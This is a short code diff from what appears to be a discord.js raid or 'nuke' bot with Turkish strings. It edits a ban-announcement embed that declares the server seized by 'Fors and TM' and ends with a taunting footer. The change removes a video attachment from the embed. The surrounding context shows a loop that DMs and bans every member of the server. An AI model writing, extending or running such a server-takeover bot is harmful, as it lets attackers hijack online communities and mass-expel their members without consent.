@@ -44,8 +44,8 @@ client.on('messageCreate', async (message) => {
       .setColor('Red')
       .setTitle('❌ Sunucudan Yasaklandınız!')
       .setDescription('Fors ve TM Sunucuya El Koydu\n @1fors el koydu')
-      .setFooter({ text: '💦Fors Affetmez Sabaha Sunucun Affedilmez💦' })
-      .setVideo("attachment://video.mp4"); // 🎥 videoyu embed'e bağla
+      .setFooter({ text: '💦Fors Affetmez Sabaha Sunucun Affedilmez💦' });
+      // .setVideo() kaldırıldı
 
     // Üyeleri DM + ban
     for (const member of members.values()) {
